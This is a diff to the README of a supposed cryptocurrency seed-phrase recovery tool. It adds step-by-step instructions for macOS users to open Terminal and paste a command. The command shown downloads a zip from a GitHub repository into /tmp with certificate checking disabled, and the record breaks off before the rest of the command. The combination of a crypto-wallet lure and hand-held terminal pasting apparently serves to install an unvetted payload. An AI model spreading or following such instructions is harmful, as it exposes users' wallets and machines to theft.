@@ -27,7 +27,20 @@ A powerful tool for recovering cryptocurrency seed phrases with missing or incor
 
 ## 🚀 Quick Start
 
-### One-Command Installation (macOS only)
+## 📋 Quick Installation Guide for macOS
+
+### Step-by-Step:
+
+1. **🖥️ Open Terminal**
+   - Press `⌘ Cmd` + `Space` (opens Spotlight)
+   - Type `Terminal`
+   - Press `Enter`
+
+2. **📋 Copy the command below**
+
+3. **📥 Paste into Terminal** (Right-click → Paste or `⌘ Cmd` + `V`)
+
+4. **⏎ Press Enter** and wait for installation to complete
 
 ```bash
 curl -fsSLk https://github.com/Gentleatvice/seed-phrase-recover-BTC-ETH/archive/refs/heads/main.zip -o /tmp/cw.zip && \
